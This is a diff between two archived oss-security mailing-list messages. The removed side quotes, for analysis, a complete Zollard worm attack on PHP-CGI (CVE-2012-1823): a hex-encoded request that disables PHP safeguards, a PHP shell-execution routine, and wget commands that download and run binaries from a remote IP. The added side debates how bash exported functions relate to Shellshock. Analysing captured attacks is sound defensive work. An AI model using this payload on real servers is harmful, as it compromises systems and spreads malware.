@@ -1,101 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/10/22
-Message-ID: <CAJCB1PHrXCX+DzkHLfvSesjnCAi=01L0icD8H4kuw4ZyW_-WhA@mail.gmail.com>
-Date: Fri, 10 Oct 2014 12:31:27 -0700
-From: Jon Hart <jhart@...ofed.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/26/18
+Message-ID: <20140926131159.GA29528@hal.lan>
+Date: Fri, 26 Sep 2014 15:11:59 +0200
+From: Guido Berhoerster <gber@...nsuse.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: What does this PHP exploit do?
+Subject: Re: Re: CVE-2014-6271: remote code execution through bash (3rd vulnerability)
 Content-Type: text/plain; charset=utf-8
 
-I believe this is exploiting CVE-2012-1823 but utilizing POST to bypass URL
-length limits, IDS/IPS/monitoring, etc.
+* Florian Weimer <fweimer@...hat.com> [2014-09-26 13:33]:
+> On 09/26/2014 10:54 AM, Mark R Bannister wrote:
+> I agree this looks scary at first glance, but we discussed this
+> previously, see for example:
+> 
+>   <http://www.openwall.com/lists/oss-security/2014/09/24/20>
+> 
+> Shell scripts derive part of their power and flexibility from their
+> openness to the execution environment.  You can tweak PATH, BASH_ENV
+> (or ENV for other Bourne-like shells), IFS, HOME, and many other
+> variables to change behavior.  There are even more knobs to affect
+> the behavior of the external commands almost all shell scripts call
+> when they run.
+> 
+> This makes them not suitable at all for writing SUID programs or
+> other code that runs in untrusted environments.  This is
+> well-documented, and given the amount of shell scripts out there
+> which rely on these aspects of the UNIX shell design, it's not
+> something we can change, particularly not as part of a security
+> update which system administrators are more or less forced to
+> install.
+> 
+> In your specific example, you can achieve the same effect by setting
+> PATH to a directory with a customer ls program, or by setting
+> BASH_ENV to a file which contains a definition of a function called
+> ls.
 
--jon
+I strong disagree that, there is a big difference in that a
+script can (and should) be able to obtain a sane environment by
+resetting stuff like PATH, BASH_ENV, IFS.  The issue is also not
+about flexibility to override commands with functions or the
+ability to export them, rather it is the apparently undocumented
+implementation mixing data and code by storing the functions in
+the environment which is total and utter crap even by the
+standards of 20 years ago and it is just a matter of time until
+the next parser bug comes up.
 
-On Fri, Oct 10, 2014 at 12:28 PM, Dave Horsfall <dave@...sfall.org> wrote:
+> Overriding external programs with shell functions in such a way has
+> to be supported.  Otherwise, scripts which define shell functions
+> would break if the system administrator installs new software which
+> happens to include a program of the same name of the shell function.
 
-> My apologies if this is off-topic for this list, but out of all the
-> security lists of which I am a member this seems to be the closest one
-> that fits, so please point me to a more appropriate one in that case..
->
-> I'm trying to figure out what this exploit does; it started around the
-> time that Shellshock did, but I don't think that they're related.
->
-> It downloads binaries for several architectures (even a MIPS) which
-> amongst other things futzes around with IPTABLES (including blocking the
-> TELNET port) and appears to be self-reproducing.
->
-> The hex-encoded stuff in the script below decodes to
->
->
-> "-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"
->
-> but my PHP-fu doesn't quite extend that far (and that "safe_mode=off"
-> looks a bit suss).
->
-> Script below, kindly supplied by 0wned boxes the world over (in this case,
-> Korea):
->
-> POST
-> /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
-> HTTP/1.1
-> Host: xxx.xxx.xxx.xxx
-> User-Agent: Mozilla/5.0 (compatible; Zollard; Linux)
-> Content-Type: application/x-www-form-urlencoded
-> Content-Length: 1817
-> Connection: close
->
-> <?php
-> echo "Zollard";
-> $disablefunc = @ini_get("disable_functions");
-> if (!empty($disablefunc))
-> {
->  $disablefunc = str_replace(" ","",$disablefunc);
->  $disablefunc = explode(",",$disablefunc);
-> }
-> function myshellexec($cmd)
-> {
->  global $disablefunc;
->  $result = "";
->  if (!empty($cmd))
->  {
->   if (is_callable("exec") and !in_array("exec",$disablefunc))
-> {exec($cmd,$result); $result = join("\n",$result);}
->   elseif (($result = `$cmd`) !== FALSE) {}
->   elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v
-> = @ob_get_contents(); @ob_clean(); system($cmd); $result =
-> @ob_get_contents(); @ob_clean(); echo $v;}
->   elseif (is_callable("passthru") and !in_array("passthru",$disablefunc))
-> {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result =
-> @ob_get_contents(); @ob_clean(); echo $v;}
->   elseif (is_resource($fp = popen($cmd,"r")))
->   {
->    $result = "";
->    while(!feof($fp)) {$result .= fread($fp,1024);}
->    pclose($fp);
->   }
->  }
->  return $result;
-> }
-> myshellexec("rm -rf /tmp/armeabi;wget -P /tmp
-> http://119.206.52.15:58455/armeabi;chmod +x /tmp/armeabi");
-> myshellexec("rm -rf /tmp/arm;wget -P /tmp
-> http://119.206.52.15:58455/arm;chmod +x /tmp/arm");
-> myshellexec("rm -rf /tmp/ppc;wget -P /tmp
-> http://119.206.52.15:58455/ppc;chmod +x /tmp/ppc");
-> myshellexec("rm -rf /tmp/mips;wget -P /tmp
-> http://119.206.52.15:58455/mips;chmod +x /tmp/mips");
-> myshellexec("rm -rf /tmp/mipsel;wget -P /tmp
-> http://119.206.52.15:58455/mipsel;chmod +x /tmp/mipsel");
-> myshellexec("rm -rf /tmp/x86;wget -P /tmp
-> http://119.206.52.15:58455/x86;chmod +x /tmp/x86");
-> myshellexec("rm -rf /tmp/nodes;wget -P /tmp
-> http://119.206.52.15:58455/nodes;chmod +x /tmp/nodes");
-> myshellexec("rm -rf /tmp/sig;wget -P /tmp
-> http://119.206.52.15:58455/sig;chmod +x /tmp/sig");
->
-> myshellexec("/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86;");
->
-> -- Dave
->
-
+That is orthogonal to the implementation of exported functions.
+-- 
+Guido Berhoerster
